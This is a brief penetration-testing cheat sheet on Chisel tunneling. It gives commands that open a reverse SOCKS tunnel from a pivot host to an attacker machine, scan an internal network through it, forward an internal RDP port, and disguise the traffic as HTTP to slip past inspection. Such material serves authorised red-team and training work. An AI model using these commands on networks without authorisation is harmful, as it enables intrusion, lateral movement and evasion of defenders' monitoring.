# Chisel (TCP/HTTP Tunneling)

Chisel creates TCP tunnels over HTTP, useful when SSH is blocked.

## SOCKS Proxy
```bash
# On attack machine (server)
chisel server -p 8000 --reverse

# On pivot (client)
chisel client $ATTACK_IP:8000 R:1080:socks

# Now proxychains through port 1080
proxychains nmap -sT -Pn 10.0.0.0/24
```

## Chisel Port Forward
```bash
# Forward an internal port to localhost
chisel client $ATTACK_IP:8000 R:3389:127.0.0.1:3389

# Now connect to localhost:3389
xfreerdp /v:127.0.0.1:3389 /u:admin /p:pass
```

## HTTP Mode (DPI Evasion)
```bash
# Traffic appears as HTTP
chisel server -p 8080 --reverse --socks5
chisel client http://$ATTACK_IP:8080 R:1080:socks
```
